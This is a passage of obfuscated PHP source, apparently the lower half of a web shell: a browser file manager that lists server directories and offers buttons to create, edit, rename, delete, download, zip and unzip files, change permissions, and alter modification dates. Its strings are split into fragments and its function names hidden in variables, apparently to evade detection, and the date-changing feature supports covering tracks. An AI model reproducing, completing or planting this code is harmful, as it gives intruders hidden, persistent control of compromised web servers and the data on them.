                echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
                <input type="hidden" name="pilih" value="Fo'.'lde'.'r"></form>';
            } else {
                red("Fa"."il"."ed to Create fol"."der !");
                echo '<form method="post"><center>Fo'.'lde'.'r : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatFo'.'lde'.'r" value="Create Fo'.'lde'.'r" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
                <input type="hidden" name="pilih" value="Fo'.'lde'.'r"></form>';
            }
        } else {
            echo '<form method="post"><center>Fo'.'lde'.'r : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatFo'.'lde'.'r" value="Create Fo'.'lde'.'r" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="Fo'.'lde'.'r"></form>';
        }
    }
} elseif (isset($_POST['lok'.'nya']) && $_POST['pilih'] == "fi"."le") {
    if ($isw("./") || $isr("./")) {
        $loke = $_POST['lok'.'nya'];
        if (isset($_POST['buatfi'.'le'])) {
            $buatf = $fpt($loke."/".$_POST['fi'.'lebaru'], "");
            if ($fxt($loke."/".$_POST['fi'.'lebaru'])) {
                green("File <b>".$hsc($_POST['fi'.'lebaru'])."</b> Created !");
                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create Fi'.'le" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
                <input type="hidden" name="pilih" value="fi'.'le"></form>';
            } else {
                red("Fa"."il"."ed to Create Fi"."le !");
                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
                <input type="hidden" name="pilih" value="fi'.'le"></form>';
            }
        } else {
            echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';
        }
    }
}

echo '<div class="table-responsive mt-4">
<table class="table table-hover table-bordered">
<thead>
<tr>
<th>Na'.'me</th>
<th class="text-center">Si'.'ze</th>
<th class="text-center">Las'.'t Mo'.'dif'.'ied</th>
<th class="text-center">Owner / Group</th>
<th class="text-center">Pe'.'rmi'.'ss'.'ions</th>
<th class="text-center">Op'.'tio'.'ns</th>
</tr>
</thead>
<tbody>';

echo "<tr>";
$euybrekw = $srl($bsn($lokasi), "", $lokasi);
$euybrekw = $srl("//", "/", $euybrekw);
echo "<td><i class='fas fa-folder' style='color: #808080'></i> <a href=\"".mkUrl(array('loknya' => $euybrekw))."\">..</a></td>
<td class='text-center'>--</td>
<td class='text-center'>".fdt($euybrekw)."</td>
<td class='text-center'>".gor($euybrekw)." / ".ggr($euybrekw)."</td>
<td class='text-center'>";
if($isw($euybrekw)) echo '<span class="text-success">';
elseif(!$isr($euybrekw)) echo '<span class="text-danger">';
echo statusnya($euybrekw);
if($isw($euybrekw) || !$isr($euybrekw)) echo '</span>';
echo "</td>
<td class='text-center'><form method=\"POST\" action=\"".mkUrl(array('pilihan' => '1', 'loknya' => $lokasi))."\" class=\"d-inline\">
<input type=\"hidden\" name=\"d\" value=\"".mawEn(array('type' => 'dir', 'loknya' => $lokasi.'/'))."\">
<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='fol"."der' title='Create Folder'><i class='fas fa-folder'></i></button>
<button type='submit' class='btn btn-sm btn-action' name='pilih' value='file' title='Create File'><i class='fas fa-file'></i></button>
</form>";
echo "</tr>";

foreach($lokasinya as $ppkcina){
	$euybre = $lokasi."/".$ppkcina;
	$euybre = $srl("//", "/", $euybre);
	if(!$idi($euybre) || $ppkcina == '.' || $ppkcina == '..') continue;
	echo "<tr>";
	echo "<td><i class='fas fa-folder' style='color: #808080'></i> <a href=\"".mkUrl(array('loknya' => $euybre))."\">".$ppkcina."</a></td>
	<td class='text-center'>--</td>
	<td class='text-center'>".fdt($euybre)."</td>
	<td class='text-center'>".gor($euybre)." / ".ggr($euybre)."</td>
	<td class='text-center'>";
	if($isw($euybre)) echo '<span class="text-success">';
	elseif(!$isr($euybre)) echo '<span class="text-danger">';
	echo statusnya($euybre);
	if($isw($euybre) || !$isr($euybre)) echo '</span>';

	echo "</td>
<td class='text-center'><form method=\"POST\" action=\"".mkUrl(array('pilihan' => '1', 'loknya' => $lokasi))."\" class=\"d-inline\">
	<input type=\"hidden\" name=\"d\" value=\"".mawEn(array('type' => 'dir', 'name' => $ppkcina, 'loknya' => $lokasi.'/'.$ppkcina))."\">
	<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahnama' title='Rename'><i class='fas fa-edit'></i></button>
	<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahtanggal' title='Change Date'><i class='fas fa-calendar'></i></button>
	<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahmod' title='Change Permission'><i class='fas fa-cog'></i></button>
	<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='zip' title='Compress to ZIP'><i class='fas fa-file-zipper'></i></button>
	<button type='submit' class='btn btn-sm btn-action' name='pilih' value='hapus' title='Delete'><i class='fas fa-trash'></i></button>
	</form></td>
	</tr>";
}
$skd = "10"."24";
foreach($lokasinya as $mekicina) {
	$euybray = $lokasi."/".$mekicina;
	if(!$ifi("$lokasi/$mekicina")) continue;
	$size = $fsz("$lokasi/$mekicina")/$skd;
	$size = $rd($size,3);
	if($size >= $skd){
	$size = $rd($size/$skd,2).' M'.'B';
} else {
	$size = $size.' K'.'B';
}

$isZipRow = preg_match('/\.zip$/i', $mekicina);
$zipBtnRow = "<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='zip' title='Compress to ZIP'><i class='fas fa-file-zipper'></i></button>";
$unzipBtnRow = $isZipRow ? "<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='unzip' title='Extract ZIP'><i class='fas fa-box-open'></i></button>" : "";

echo "<tr>
<td>".cfn($euybray)." <a href=\"".mkUrl(array('lokasie' => $lokasi.'/'.$mekicina, 'loknya' => $lokasi))."\">$mekicina</a></td>
<td class='text-center'>".$size."</td>
<td class='text-center'>".fdt($euybray)."</td>
<td class='text-center'>".gor($euybray)." / ".ggr($euybray)."</td>
<td class='text-center'>";
if($isw("$lokasi/$mekicina")) echo '<span class="text-success">';
elseif(!$isr("$lokasi/$mekicina")) echo '<span class="text-danger">';
echo statusnya("$lokasi/$mekicina");
if($isw("$lokasi/$mekicina") || !$isr("$lokasi/$mekicina")) echo '</span>';
echo "</td><td class='text-center'>
<form method=\"post\" action=\"".mkUrl(array('pilihan' => '1', 'loknya' => $lokasi))."\" class=\"d-inline\">
<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='edit' title='Edit'><i class='fas fa-edit'></i></button>
<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahnama' title='Rename'><i class='fas fa-signature'></i></button>
<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahtanggal' title='Change Date'><i class='fas fa-calendar'></i></button>
<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='ubahmod' title='Change Permission'><i class='fas fa-cog'></i></button>
<button type='submit' class='btn btn-sm btn-action me-1' name='pilih' value='dunlut' title='Download'><i class='fas fa-down"."load'></i></button>
".$zipBtnRow.$unzipBtnRow."
<button type='submit' class='btn btn-sm btn-action' name='pilih' value='hapus' title='Delete'><i class='fas fa-trash'></i></button>
<input type=\"hidden\" name=\"d\" value=\"".mawEn(array('type' => 'file', 'name' => $mekicina, 'loknya' => $lokasi.'/'.$mekicina))."\">
</form></td>
</tr>";
}
echo '</tbody></table></div>';
echo '<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>';
echo '</main></div></body></html>';

function statusnya($fl){
	$a = "sub"."st"."r";
	$b = "s"."pri"."ntf";
	$c = "fil"."eper"."ms";
$izin = $a($b('%o', $c($fl)), -4);
return $izin;
}
?>